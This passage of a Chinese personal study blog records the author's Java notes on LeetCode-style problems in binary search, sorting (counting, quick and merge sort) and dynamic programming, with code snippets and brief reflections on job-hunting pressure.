java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二分查找。每次取left、right指针的中间，如果mid*mid小于目标值，移动左指针到(mid-<span class="number">1</span>)，否则移动右指针到(mid+<span class="number">1</span>)。注意，判断条件left&lt;=right，这样如果目标值为<span class="number">0</span>就能处理。结果返回(left-<span class="number">1</span>)，因为mid才是平方恰小于目标值的数。（关键词，二分查找）</span><br><span class="line">    还需要<span class="type">long</span>来处理一些特别的测试用例。</span><br></pre></td></tr></table></figure><h3 id="073、狒狒吃香蕉（875、9月26日）"><a href="#073、狒狒吃香蕉（875、9月26日）" class="headerlink" title="073、狒狒吃香蕉（875、9月26日）"></a>073、狒狒吃香蕉（875、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，二分查找。没想到这样的题也能用二分查找，首先是在给定速度speed下时间的计算公式：</span><br><span class="line"><span class="type">int</span> <span class="variable">curTime</span> <span class="operator">=</span> (pile+speed-<span class="number">1</span>)/speed;</span><br><span class="line">time += curTime;</span><br><span class="line">这道题的思路就是，在最低、最高速度范围内，通过二分查找选出速度，并计算时间，如果时间低于目标值，就减小速度的最高界，反之增加速度的最低界。根据题解，狒狒吃香蕉速度最低每小时<span class="number">1</span>根，最高每小时最大堆根，因此将left、right指针分别指向<span class="number">0</span>和max，在二分查找时更新left、right指针，并更新获得的最低速度。</span><br><span class="line">    （关键词，二分查找速度+计算时间再判断）</span><br></pre></td></tr></table></figure><h3 id="总结之二分查找"><a href="#总结之二分查找" class="headerlink" title="总结之二分查找"></a>总结之二分查找</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>在一个长度为n的数组中查找一个数字，从左到右遍历的话需要O(n)的时间；如果数组是排序的（通常递增），那么可以采用二分查找进行优化。二分查找步骤如下：</span><br><span class="line">取出位于数组中间的数字和目标数字比较，如果中间数字大于目标数字，那么只需要查找数组的前半部分，没必要再看后半部分。</span><br><span class="line"><span class="number">2.</span>经典二分查找代码：（关键词，left和right双指针，每轮取中间）</span><br><span class="line">    经典的二分查找代码，维护left和right双指针，当left&lt;=right时，每轮取中间与目标值比较，根据大小关系决定移动哪个指针，下一轮遍历哪半部分。其中，left等于right是因为，长度为<span class="number">1</span>的子数组也是有效范围。</span><br><span class="line"><span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">            right = mid-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> left;  <span class="comment">//如果找不到则返回比target大的后一位</span></span><br><span class="line"><span class="number">3.</span>Random API复制记录：</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total);  <span class="comment">//在[0,total-1]中随机取值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total)+<span class="number">1</span>;  <span class="comment">//在[1,total]中随机取值</span></span><br></pre></td></tr></table></figure><h2 id="第十二章、排序"><a href="#第十二章、排序" class="headerlink" title="第十二章、排序"></a>第十二章、排序</h2><h3 id="074、合并区间（56、9月26日）"><a href="#074、合并区间（56、9月26日）" class="headerlink" title="074、合并区间（56、9月26日）"></a>074、合并区间（56、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，先排序再比较。先将二维数组内层根据start从小到达排序，这时候就可比较相邻数组的end。这里使用双重<span class="keyword">while</span>控制，对于内层<span class="keyword">while</span>，如果遍历到的新数组start仍小于临时数组的end，就将新数组范围添加到临时数组（即更新临时数组end），直到某新数组不符合要求，则将临时数组添加到结果集中，在当前遍历点开始新一轮外层循环。</span><br><span class="line">    （关键词，排序后双<span class="keyword">while</span>）</span><br><span class="line"><span class="number">2.</span>数组操作相关api：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br></pre></td></tr></table></figure><h3 id="075、数组相对排序（1122、9月27日）"><a href="#075、数组相对排序（1122、9月27日）" class="headerlink" title="075、数组相对排序（1122、9月27日）"></a>075、数组相对排序（1122、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>计数排序：如果数组长度为n，整数范围（最大整数和最小整数的差值）为k，对于k远小于n的场景，计数排序的时间复杂度优于其他基于比较的排序算法（如归并排序，快速排序等）。计数排序的基本思想是，先统计数组中每个整数在数组中出现的次数，然后按照从小到大的顺序将每个整数按照它出现的次数填到数组中。</span><br><span class="line">    即先根据输入的极值为每个可能的位置挖好坑（辅助数组），再遍历数组将每个位置的次数输入辅助数组，最后按顺序遍历辅助数组即可得到有序的结果。时间复杂度O(n+k)，空间复杂度O(k)。（关键词，counts数组）</span><br><span class="line">    <span class="comment">//计数排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            min = Math.min(min,num);</span><br><span class="line">            max = Math.max(max,num);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] counts = <span class="keyword">new</span> <span class="title class_">int</span>[max-min+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            counts[num-min]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num=min;num&lt;=max;num++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(counts[num-min]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                nums[i++] = num;</span><br><span class="line">                counts[num-min] -- ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，计数排序。题目提示<span class="number">0</span> &lt;= arr1[i], arr2[i] &lt;= <span class="number">1000</span>，给出了数字范围k，是可以用计数排序的提示。先定义counts数组为<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>]，将arr1数组中每个数字的次数填入counts数组的对应索引位置，遍历arr2数组将counts数组对应数字依次取出，再将counts数组剩余元素依次取出，即可得到有序结果。（关键词，arr1放入counts[<span class="number">1001</span>]）</span><br></pre></td></tr></table></figure><h3 id="076、数组中的第k大的数字（215、9月27日）"><a href="#076、数组中的第k大的数字（215、9月27日）" class="headerlink" title="076、数组中的第k大的数字（215、9月27日）"></a>076、数组中的第k大的数字（215、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>快速排序：快速排序的基本思想是分治法，排序过程如下：在输入数组中随机选取一个元素作为中间值（pivot），然后对数组进行分区（partition），使所有比中间值小的数据移动到数组的左边，所有比中间值大的数据移动到数组的右边。接下来对两侧的子数组用相同的步骤排序，直到子数组只有一个数字为止。（关键词，随机获取中间值+small指针交换）</span><br><span class="line"><span class="comment">//快速排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_quick(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        quicksort(nums,<span class="number">0</span>, nums.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(end&gt;start)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">pivot</span> <span class="operator">=</span> partition(nums,start,end);</span><br><span class="line">            quicksort(nums,start,pivot-<span class="number">1</span>);</span><br><span class="line">            quicksort(nums,pivot+<span class="number">1</span>,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//small指针始终指向已经发现的最后一个小于中间值的数字</span></span><br><span class="line"><span class="comment">//即对于某一子数组，从左到右遍历时，如果发现nums[i]小于中间值，就和small指针位置的数字交换；介于small到i的数字，都是比中间值要大的数字，当i到达end时，将small指针位置数字和end交换，就使得大于中间值的数字放在了右边。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">partition</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(end-start+<span class="number">1</span>)+start;</span><br><span class="line">        swap(nums,random,end);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> start - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;end;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&lt;nums[end])&#123;</span><br><span class="line">                small++;</span><br><span class="line">                swap(nums,i,small);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        small++;</span><br><span class="line">        swap(nums,small,end);</span><br><span class="line">        <span class="comment">//不是返回random，而是返回small，观察两次交换，random位置的值先到end，再到了small</span></span><br><span class="line">        <span class="keyword">return</span> small;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> index1,<span class="type">int</span> index2)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index1!=index2)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[index1];</span><br><span class="line">            nums[index1] = nums[index2];</span><br><span class="line">            nums[index2] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，快速排序+二分查找。先通过partition方法获取确定的中间值索引index，如果index小于目标索引位置，说明需要在右侧子数组中继续寻找，将二分查找的left指针指向index+<span class="number">1</span>；如果index大于目标索引位置，说明需要在左侧子数组中继续寻找，将二分查找的right指针指向index-<span class="number">1</span>；并继续递归调用partition方法，直到撞出目标索引位置后返回。（关键词，快排+二分查找）</span><br></pre></td></tr></table></figure><h3 id="077、链表排序（148、9月27日）"><a href="#077、链表排序（148、9月27日）" class="headerlink" title="077、链表排序（148、9月27日）"></a>077、链表排序（148、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>归并排序：归并排序也是一种基于分治法的排序算法，为了排序长度为n的数组，需要先排序两个长度为n/<span class="number">2</span>的子数组，然后合并两个排序的子数组。示例：  需要维护两个数组来回倒腾（关键词，子数组翻倍排序）</span><br><span class="line">    [<span class="number">4</span>,<span class="number">1</span>, <span class="number">5</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">7</span>, <span class="number">8</span>,<span class="number">3</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">4</span>, <span class="number">5</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">7</span>, <span class="number">3</span>,<span class="number">8</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>    <span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>   ]</span><br><span class="line"><span class="comment">//归并排序 非递归实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_guibing(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] src = nums;</span><br><span class="line">        <span class="type">int</span>[] dst = <span class="keyword">new</span> <span class="title class_">int</span>[length];</span><br><span class="line">    <span class="comment">//外层遍历每次翻倍合并两个数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> seg=<span class="number">1</span>;seg&lt;length;seg+=seg)&#123;</span><br><span class="line">            <span class="comment">//内层遍历从左到右，合并排序2*seg范围里的两个有序子数组，</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> start=<span class="number">0</span>;start&lt;length;start+=seg*<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> Math.min(start+seg, length);</span><br><span class="line">                <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(start+seg*<span class="number">2</span>,length);</span><br><span class="line">                <span class="type">int</span> i=start,j=mid,k=start;</span><br><span class="line">                <span class="keyword">while</span>(i&lt;mid||j&lt;end)&#123;</span><br><span class="line">                    <span class="comment">//靠右的子数组可能先结束，如果其提前结束，就只选取前一数组的值</span></span><br><span class="line">                    <span class="keyword">if</span>(j == end||(i&lt;mid&amp;&amp;src[i]&lt;src[j]))&#123;</span><br><span class="line">                        dst[k++] = src[i++];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dst[k++] = src[j++];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换src和temp，屠龙勇士终成龙</span></span><br><span class="line">            <span class="type">int</span>[] temp = src;</span><br><span class="line">            src = dst;</span><br><span class="line">            dst = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//归并排序 递归实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_guibing2(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span>[] dst = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        dst = Arrays.copyOf(nums,nums.length);</span><br><span class="line">        mergeSort(nums,dst,<span class="number">0</span>,nums.length);</span><br><span class="line">        <span class="keyword">return</span> dst;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] src,<span class="type">int</span>[] dst,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start+<span class="number">1</span>&gt;=end)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (start+end)/<span class="number">2</span>;</span><br><span class="line">        mergeSort(dst,src,start,mid);</span><br><span class="line">        mergeSort(dst,src,mid,end);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start,j = mid,k = start;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;mid||j&lt;end)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j == end||(i&lt;mid&amp;&amp;src[i]&lt;src[j]))&#123;</span><br><span class="line">                dst[k++] = src[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dst[k++] = src[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，归并排序。最近有点急火攻心，感冒了也迷茫了，在不知道的位置滚雪球，真的是在前进吗？总体结构如下代码，先通过split方法（快慢指针）获取链表的中间位置并切开，递归调用sortList将两边排序好后，再用merge方法组合两个链表。在merge方法中，因为传入两个链表的目的就是合并，因此可以移动两个链表的头指针，比较两个头指针大小后接到新链表cur上。</span><br><span class="line">    （关键词，快慢指针切开+归并排序）</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head1</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head2</span> <span class="operator">=</span> split(head);</span><br><span class="line">        </span><br><span class="line">        head1 = sortList(head1);</span><br><span class="line">        head2 = sortList(head2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> merge(head1,head2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="078、合并排序链表（23、9月27日）"><a href="#078、合并排序链表（23、9月27日）" class="headerlink" title="078、合并排序链表（23、9月27日）"></a>078、合并排序链表（23、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，最小堆。定义PriorityQueue如下，首先将每个链表的表头放入minHeap，由于是最小堆，此时poll操作获取值最小的节点，先将该节点链入新列表，再将其next指针指向的节点再放入minHeap，重复次操作直到最小堆为空。</span><br><span class="line">PriorityQueue&lt;ListNode&gt; minHeap = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.val-e2.val);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，归并排序。将这些列表看作经典代码split方法切割后的列表。这时候只有对两边数组排序后再合并即可。注意边界调节，如果某范围start+<span class="number">1</span>==end，说明只有一条链表，此时不用再切开递进，直接返回后准备在上一层和另一条链表进行合并。</span><br><span class="line">    （关键词，索引切开+链表归并排序+最小单位是一条链表）</span><br></pre></td></tr></table></figure><h3 id="总结之排序"><a href="#总结之排序" class="headerlink" title="总结之排序"></a>总结之排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>面试经常要求应聘者比较插入排序、冒泡排序、堆排序、计数排序、归并排序和快速排序等不同算法的优劣，需要能够从额外空间消耗、平均时间复杂度和最差时间复杂度方面比较，最可能遇到的是计数排序、快速排序和归并排序。</span><br><span class="line"><span class="number">2.</span>排序能够为二分查找创建基础，在时间复杂度允许的情况下，可以先排序再解题。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>数组操作相关api记录复制：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>计数排序定义即经典代码 见<span class="number">075</span>、数组相对排序；      时间O(n+k)</span><br><span class="line">  快速排序定义即经典代码 见<span class="number">076</span>、数组中的第k大的数字；  平均时间O(nlogn)</span><br><span class="line">  归并排序定义即经典代码 见<span class="number">077</span>、链表排序； 时间O(nlogn)  空间O(n)</span><br><span class="line"><span class="number">5.</span>链表归并排序，合并时的经典复用代码（即按顺序合并两条有序的单链表）：</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">merge</span><span class="params">(ListNode head1,ListNode head2)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span>(head1!=<span class="literal">null</span>&amp;&amp;head2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head1.val&lt;=head2.val)&#123;</span><br><span class="line">                cur.next = head1;</span><br><span class="line">                <span class="comment">//改造链表是因为，当被传入merge时已经是切成的小段，目的就是连城大段</span></span><br><span class="line">                head1= head1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur.next = head2;</span><br><span class="line">                head2 = head2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = head1==<span class="literal">null</span>?head2:head1;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">6.</span>从<span class="number">8</span>月<span class="number">14</span>日走向<span class="number">9</span>月<span class="number">27</span>日，从最开始感受到稳定进步的兴奋，到现在每天滚着雪球惯性向前的茫然，这一个半月，听着师兄们找工作的挫败感，记起最初Java安全岗的梦想飘然远逝，在西电的深色夜幕中，汹涌人潮在黑暗中起落不止，失去光彩的星星一颗颗砸入噤声的大海。</span><br><span class="line">不管怎么样，一个原以为坚持不下来的小阶段，还是磕磕绊绊地完成了，我知道了刷题到底是怎么回事。在接下来的“动态规划”和“图”两章中，我要适当放慢自己地脚步，将刷题约束在明确时间范围内，并在十月结束前刷完这本书，结束笔记。剩下的时间追逐梦想吧！！！</span><br></pre></td></tr></table></figure><h2 id="第十四章、动态规划"><a href="#第十四章、动态规划" class="headerlink" title="第十四章、动态规划"></a>第十四章、动态规划</h2><h3 id="088、爬楼梯的最少成本（746、10月31日）"><a href="#088、爬楼梯的最少成本（746、10月31日）" class="headerlink" title="088、爬楼梯的最少成本（746、10月31日）"></a>088、爬楼梯的最少成本（746、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>打算用整个十一月把top100和剑指offer2刷完，遂重启该部分，开始学习动态规划。</span><br><span class="line"><span class="number">2.</span>我的想法，递归。我知道爬楼梯的公式是f(x)=f(x-<span class="number">1</span>)+f(x-<span class="number">2</span>)，但显然使用递归是不理智的，因为对于dfs(<span class="number">8</span>)或dfs(<span class="number">9</span>)都要计算dfs(<span class="number">7</span>)及以下，时间开销很大所以没通过。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，动态规划。用迭代实现，规定dp[i]从i位置起步的最小开销，则有dp[<span class="number">0</span>]=cost[<span class="number">0</span>]，dp[<span class="number">1</span>]=cost[<span class="number">1</span>]，从i=<span class="number">2</span>开始计算即可。</span><br></pre></td></tr></table></figure><h3 id="089、房屋偷盗（198、10月31日）"><a href="#089、房屋偷盗（198、10月31日）" class="headerlink" title="089、房屋偷盗（198、10月31日）"></a>089、房屋偷盗（198、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。感觉自己还是挺聪明的，懂得变化。这道题不能偷盗相邻的房子，和爬楼梯的最少成本很相似，因此，定义dp[i]表示偷盗到第i个房子的积累金额，那么dp[i]的计算由于无后效性，不应该太远：</span><br><span class="line">合法的上一次偷盗是dp[i-<span class="number">2</span>]，但是dp[i-<span class="number">2</span>]不能包括dp[i-<span class="number">3</span>]的情况，故表示该情况为dp[i-<span class="number">1</span>]-nums[i]，故计算公式如下：</span><br><span class="line">dp[i] = Math.max(dp[i-<span class="number">2</span>],dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>])+nums[i];   <span class="comment">//两种情况：不相邻的合法、相邻的合法</span></span><br></pre></td></tr></table></figure><h3 id="090、环形房屋偷盗（213、10月31日）"><a href="#090、环形房屋偷盗（213、10月31日）" class="headerlink" title="090、环形房屋偷盗（213、10月31日）"></a>090、环形房屋偷盗（213、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题相比第<span class="number">89</span>道题多了一条限制，即路径中不可以同时出现第<span class="number">0</span>号屋子和第(nums.length-<span class="number">1</span>)号屋子。因此，将问题划分为两个子问题，[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围里的最优解和[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围里的最优解，只需要将输入数组范围改变即可。</span><br><span class="line">    对于[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围，可以初始化dp[<span class="number">0</span>]=<span class="number">0</span>，dp[<span class="number">1</span>]=nums[<span class="number">1</span>]，dp[<span class="number">2</span>]=nums[<span class="number">2</span>]，从i=<span class="number">3</span>开始公式计算；对于[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围照旧即可。最后返回这两个最优解中的最大值。</span><br><span class="line">    此外，需要注意nums.length&lt;=<span class="number">2</span>时的特殊情况。</span><br></pre></td></tr></table></figure><h3 id="091、粉刷房子（256、11月2日）"><a href="#091、粉刷房子（256、11月2日）" class="headerlink" title="091、粉刷房子（256、11月2日）"></a>091、粉刷房子（256、11月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。没得想法，看到题解状态转移公式时恍然大悟，一共有三个表达式r(i)、b(i)和g(i)，计算方法一致皆为</span><br><span class="line">    r(i) = min(b(i-<span class="number">1</span>),g(i-<span class="number">1</span>))+cost[i][<span class="number">0</span>]  <span class="comment">//r(i)表示本次选择粉刷红色时，从0到i所有房子的最小成本</span></span><br><span class="line">因此，每栋房子粉刷的颜色受上一幢房子决定，无后效性。</span><br><span class="line">    <span class="keyword">return</span> Math.min(r[n-<span class="number">1</span>],Math.min(b[n-<span class="number">1</span>],g[n-<span class="number">1</span>]));  <span class="comment">//三值比较更为优雅的写法</span></span><br><span class="line">因为转移公式中只涉及dp[i-<span class="number">1</span>]和dp[i]，可以进一步减小空间复杂度：</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">如示例中，b[i-<span class="number">1</span>]表示为dp[(j+<span class="number">1</span>)%<span class="number">3</span>][(i-<span class="number">1</span>)%<span class="number">2</span>]，g[i-<span class="number">1</span>]表示为dp[(j+<span class="number">2</span>)%<span class="number">3</span>][(i-<span class="number">1</span>)%<span class="number">2</span>]。</span><br></pre></td></tr></table></figure><h3 id="092、翻转字符（926、11月3日）"><a href="#092、翻转字符（926、11月3日）" class="headerlink" title="092、翻转字符（926、11月3日）"></a>092、翻转字符（926、11月3日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。显然这道题要分情况讨论，应该有两个状态转移方程。根据题解，设f(i)表示把字符串中从<span class="number">0</span>到i的字符变成符合要求的字符并且最后一个字符是<span class="string">&#x27;0&#x27;</span>所需最少翻转次数；设g[i]表示把字符串从<span class="number">0</span>到i的字符变成符合要求并且最后一个字符时<span class="string">&#x27;1&#x27;</span>所需最少反转次数。</span><br><span class="line">当字符串中下标i的字符是<span class="string">&#x27;0&#x27;</span>时，f(i)=f(i-<span class="number">1</span>)，是<span class="string">&#x27;1&#x27;</span>时则f(i)=f(i-<span class="number">1</span>)+<span class="number">1</span>；</span><br><span class="line">当字符串中下标i的字符是<span class="string">&#x27;0&#x27;</span>时，g(i)=min&#123;f(i-<span class="number">1</span>),g(i-<span class="number">1</span>)&#125;+<span class="number">1</span>，是<span class="string">&#x27;1&#x27;</span>时则g(i)=min(f(i-<span class="number">1</span>),g(i-<span class="number">1</span>))；</span><br><span class="line"><span class="number">2.</span>做这道题时，猜到会和粉刷房子一样，存在两个转移方程。但还是差点感觉，所有转移函数的定义都是包含本索引的，在本索引做了什么事情后，从<span class="number">0</span>到本索引的最小成本。无后效性，本索引i的成本只与(i-<span class="number">1</span>)相关，除非(i-<span class="number">1</span>)不能表达所有情况，才会与(i-<span class="number">2</span>)相关，但是不会太远。</span><br></pre></td></tr></table></figure><h3 id="093、最长斐波那契数列（873、11月3日）"><a href="#093、最长斐波那契数列（873、11月3日）" class="headerlink" title="093、最长斐波那契数列（873、11月3日）"></a>093、最长斐波那契数列（873、11月3日）</h3><figure class="highlight java"><table><tr><td 